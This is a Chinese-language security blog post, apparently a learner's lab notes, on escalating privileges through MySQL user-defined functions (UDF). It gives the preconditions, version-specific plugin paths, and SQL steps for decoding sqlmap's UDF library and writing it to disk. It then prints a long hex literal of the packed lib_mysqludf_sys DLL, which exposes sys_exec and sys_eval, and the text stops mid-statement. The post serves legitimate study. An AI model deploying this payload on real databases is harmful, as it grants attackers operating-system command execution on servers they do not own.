<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>权限提升学习 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>权限提升学习</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-25T11:17:51.329Z" id="date"> 2023-09-25</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-25T13:46:39.615Z" id="updated"> 2023-09-25</time></div></span><br><span>文章总字数: <div class="control">2.8k</div></span><br><span>预计阅读时间: <div class="control">11 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。</p>
<p>最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说，直接开卷！！！</p>
<h1>0x02 MySQL-udf 提权</h1>
<h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2-1-简介"></a>2.1 简介</h2>
<p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p>
<p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p>
<h2 id="2-2-利用条件"><a href="#2-2-利用条件" class="headerlink" title="2-2-利用条件"></a>2.2 利用条件</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）<br>2. 从udf文件中引入自定义函数(user defined function)<br>3. 执行自定义函数<br></code></pre></td></tr></table></figure>
<p><strong>mysql用户权限问题</strong></p>
<p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
<p>拥有将udf.dll写入相应目录的权限。</p>
<p><strong>数据库版本问题</strong></p>
<p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL &lt; 5.0</td>
<td>导出路径随意；</td>
</tr>
<tr>
<td>5.0 &lt;= MySQL&lt; 5.1</td>
<td>需要导出至目标服务器的系统目录（如：c:/windows/system32/）</td>
</tr>
<tr>
<td>5.1 &lt; MySQL</td>
<td>必须导出到MySQL安装目录下的lib\plugin文件夹下</td>
</tr>
</tbody>
</table>
<p>一般Lib、Plugin文件夹需要手工建立（可用<strong>NTFS ADS</strong>流模式突破进而创建文件夹）不过这种方法暂未见过。</p>
<h3 id="2-2-1-常规情况："><a href="#2-2-1-常规情况：" class="headerlink" title="2-2-1-常规情况："></a>2.2.1 常规情况：</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；<br><br>2. CREATE权限、FILE权限（root用户默认拥有所有权限）。<br></code></pre></td></tr></table></figure>
<p>首先基础语法查询是否 secure_file_priv 没有限制</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>NULL</td>
<td>不允许导入或导出</td>
</tr>
<tr>
<td>/tmp</td>
<td>只允许在 /tmp 目录导入导出</td>
</tr>
<tr>
<td>空</td>
<td>不限制目录</td>
</tr>
</tbody>
</table>
<blockquote>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
</blockquote>
<h3 id="2-2-2-特殊情况："><a href="#2-2-2-特殊情况：" class="headerlink" title="2-2-2-特殊情况："></a>2.2.2 特殊情况：</h3>
<p>INSERT权限；</p>
<p>UPDATE权限；</p>
<p>DELETE权限。</p>
<h4 id="查看当前数据库用户权限："><a href="#查看当前数据库用户权限：" class="headerlink" title="查看当前数据库用户权限："></a>查看当前数据库用户权限：</h4>
<p>我们进入mysql所在的bin目录下打开cmd输入账号密码登录数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1)\G;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925193740072.png'><img src="image-20230925193740072.png" alt="image-20230925193740072"></p>
<p>可以看到当前用户的权限情况，Y代表有对应的权限</p>
<h2 id="2-3-版本特性"><a href="#2-3-版本特性" class="headerlink" title="2-3-版本特性"></a>2.3 版本特性</h2>
<p>udf提权操作中的一个步骤是将我们的udf文件上传到mysql的检索目录中，Windows系统下mysql各版本的检索目录有所不同：</p>
<h3 id="1、-Mysql-5-0"><a href="#1、-Mysql-5-0" class="headerlink" title="1、-Mysql-5-0"></a>1、 Mysql &lt; 5.0</h3>
<p>导出路径随意。</p>
<h3 id="2、-5-0-Mysql-5-1"><a href="#2、-5-0-Mysql-5-1" class="headerlink" title="2、-5-0-Mysql-5-1"></a>2、 5.0 &lt;= Mysql &lt; 5.1</h3>
<p>Win2000导出路径： C:/Winnt/udf.dll</p>
<p>其他Windows系统导出路径均为：C:/Windows/udf.dll或C:/Windows/system32/udf.dll</p>
<h3 id="3、-Mysql-5-1"><a href="#3、-Mysql-5-1" class="headerlink" title="3、-Mysql-5-1"></a>3、 Mysql &gt;= 5.1</h3>
<p>Mysql安装目录的lib\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\plugin目录大概率是不存在的，需要自行创建。</p>
<p>由于这里还得搭配环境，我这里选择在虚拟机上下载小皮（自带mysql）</p>
<p class='item-img' data-src='image-20230925195617350.png'><img src="image-20230925195617350.png" alt="image-20230925195617350"></p>
<p>搭建成功！</p>
<h2 id="2-4-UDF文件位置"><a href="#2-4-UDF文件位置" class="headerlink" title="2-4-UDF文件位置"></a>2.4 UDF文件位置</h2>
<h3 id="1、sqlmap："><a href="#1、sqlmap：" class="headerlink" title="1、sqlmap："></a>1、sqlmap：</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap\data\udf\mysql<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925195858624.png'><img src="image-20230925195858624.png" alt="image-20230925195858624"></p>
<h3 id="2、metaspliot："><a href="#2、metaspliot：" class="headerlink" title="2、metaspliot："></a>2、metaspliot：</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework/data/exploits/mysql<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925200105640.png'><img src="image-20230925200105640.png" alt="image-20230925200105640"></p>
<h2 id="2-5-操作步骤"><a href="#2-5-操作步骤" class="headerlink" title="2-5-操作步骤"></a>2.5 操作步骤</h2>
<h3 id="1、查看可导出文件位置"><a href="#1、查看可导出文件位置" class="headerlink" title="1、查看可导出文件位置"></a>1、查看可导出文件位置</h3>
<p class='item-img' data-src='image-20230925200241394.png'><img src="image-20230925200241394.png" alt="image-20230925200241394"></p>
<p>这里看到我是NULL很明显不能利用了，因此我跟着网上文章改了一下配置为空，方便接下来操作</p>
<p class='item-img' data-src='image-20230925201457620.png'><img src="image-20230925201457620.png" alt="image-20230925201457620"></p>
<h3 id="2、查看当前数据库用户权限"><a href="#2、查看当前数据库用户权限" class="headerlink" title="2、查看当前数据库用户权限"></a>2、查看当前数据库用户权限</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1)\G;<br></code></pre></td></tr></table></figure>
<p>可以看到有几个关键的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Select_priv: Y<br>Insert_priv: Y<br>Update_priv: Y<br>Delete_priv: Y<br></code></pre></td></tr></table></figure>
<h3 id="3、确认mysql安装位置"><a href="#3、确认mysql安装位置" class="headerlink" title="3、确认mysql安装位置"></a>3、确认mysql安装位置</h3>
<p class='item-img' data-src='image-20230925201646050.png'><img src="image-20230925201646050.png" alt="image-20230925201646050"></p>
<p class='item-img' data-src='image-20230925201736284.png'><img src="image-20230925201736284.png" alt="image-20230925201736284"></p>
<h3 id="4、通过主机版本及架构确认mysql位数来选用udf文件"><a href="#4、通过主机版本及架构确认mysql位数来选用udf文件" class="headerlink" title="4、通过主机版本及架构确认mysql位数来选用udf文件"></a>4、通过主机版本及架构确认mysql位数来选用udf文件</h3>
<p>此处显示为Windows 64位操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show variables like &#x27;%compile%&#x27;;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925201847107.png'><img src="image-20230925201847107.png" alt="image-20230925201847107"></p>
<h3 id="5、查看数据库版本，判断udf文件写入位置"><a href="#5、查看数据库版本，判断udf文件写入位置" class="headerlink" title="5、查看数据库版本，判断udf文件写入位置"></a>5、查看数据库版本，判断udf文件写入位置</h3>
<p class='item-img' data-src='image-20230925201939661.png'><img src="image-20230925201939661.png" alt="image-20230925201939661"></p>
<h4 id="5-1-mysql大于5-1版本时"><a href="#5-1-mysql大于5-1版本时" class="headerlink" title="5-1-mysql大于5-1版本时"></a>5.1 mysql大于5.1版本时</h4>
<p><strong>查看 plugin 目录，存在lib\plugin目录且有webshell时，直接上传udf文件。</strong></p>
<p class='item-img' data-src='image-20230925202112099.png'><img src="image-20230925202112099.png" alt="image-20230925202112099"></p>
<p><strong>查看 plugin 目录，存在lib\plugin目录但没有webshell时，则需要以16进制编码写入udf文件。</strong></p>
<p>很明显我们这里的情况是后者</p>
<h5 id="5-1-2-sqlmap-udf文件解码"><a href="#5-1-2-sqlmap-udf文件解码" class="headerlink" title="5-1-2-sqlmap-udf文件解码"></a>5.1.2 sqlmap udf文件解码</h5>
<p>​		首先将对应版本的udf文件进行16进制编码（sqlmap中的udf文件为防止误杀默认是经过异或编码的，需先使用sqlmap自带的脚本解码）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925202546055.png'><img src="image-20230925202546055.png" alt="image-20230925202546055"></p>
<p class='item-img' data-src='image-20230925202705267.png'><img src="image-20230925202705267.png" alt="image-20230925202705267"></p>
<h5 id="5-1-3-16进制编码udf文件"><a href="#5-1-3-16进制编码udf文件" class="headerlink" title="5-1-3-16进制编码udf文件"></a>5.1.3 16进制编码udf文件</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select hex(load_file(&#x27;C:\\lib_mysqludf_sys.dll&#x27;)) into dumpfile &#x27;C:\\lib_mysqludf_sys.txt&#x27;;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230925203656117.png'><img src="image-20230925203656117.png" alt="image-20230925203656117"></p>
<p class='item-img' data-src='image-20230925203714767.png'><img src="image-20230925203714767.png" alt="image-20230925203714767"></p>
<h5 id="5-1-4-udf写入plugin目录"><a href="#5-1-4-udf写入plugin目录" class="headerlink" title="5-1-4-udf写入plugin目录"></a>5.1.4 udf写入plugin目录</h5>
<p>将16进制编码后udf文件使用dumpfile函数写入磁盘（outfile导出文件会在末尾写入新行且转义换行符，破坏二进制文件结构，dumpfile不会进行任何操作）。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07</span><br><span class="hljs-number">031</span>F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F73657400